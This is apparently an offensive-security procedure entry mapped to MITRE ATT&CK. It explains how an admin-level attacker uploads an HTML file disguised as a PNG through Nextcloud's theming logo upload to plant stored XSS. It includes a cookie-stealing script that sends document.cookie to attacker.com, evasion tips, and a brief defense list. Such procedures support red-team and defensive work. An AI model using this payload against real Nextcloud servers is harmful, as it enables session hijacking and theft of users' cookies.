---
tags:
  - arbitrary-file-upload
  - html-upload
  - xss-payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:09.966Z'
sub_techniques: []
id: 95e1133d-a1d7-44fd-b681-3187f94879c5
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
---
# Upload-Malicious-HTML-File-via-Theming

## Summary

This procedure exploits the absence of file type validation in Nextcloud's theming upload to inject a malicious HTML file containing JavaScript, stored in the data directory for later execution as client-side code.

## Description

Nextcloud's theming feature allows admins to upload images for logos and backgrounds, but it does not validate or process uploads as images, permitting HTML files (even with .png extensions) to be saved to paths like ../data/themedinstancelogo or ../data/themedbackgroundlogo. This enables embedding XSS payloads that execute when accessed. The attack targets web admins in a PHP-based Nextcloud setup, with outcomes including potential session hijacking if viewed by other users. Prerequisites include admin access from the prior procedure.

## Requirements

1. Administrative access to Nextcloud theming settings
2. A prepared HTML file with malicious JavaScript (e.g., <script>alert('XSS')</script> or exfiltration code)
3. Web browser to perform the upload

## Defense

Defensive measures and detection strategies:

- Implement server-side file type validation and MIME checking before storage
- Scan uploads for executable content like <script> tags using WAF rules
- Log all admin uploads and alert on non-image file extensions or content types

## Objectives

1. Successfully upload arbitrary HTML without rejection
2. Verify storage in the data directory paths
3. Prepare for client-side execution

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create the payload file to bypass superficial checks.

Use a text editor to create malicious.html with content like: <html><body><script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script></body></html>. Optionally rename to malicious.png.

> File ready for upload; size should mimic an image to avoid suspicion.

### Step 2: Perform Upload

**Context**: Use the theming interface to submit the file.

In the theming settings, select the Logo or Login background upload field and choose the prepared file. Submit the form.

> Upload completes without errors; Nextcloud saves it to ../data/themedinstancelogo or similar, treating it as plain text if PHP but executing as HTML in browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- arbitrary-file-upload
- html-upload
- xss-payload
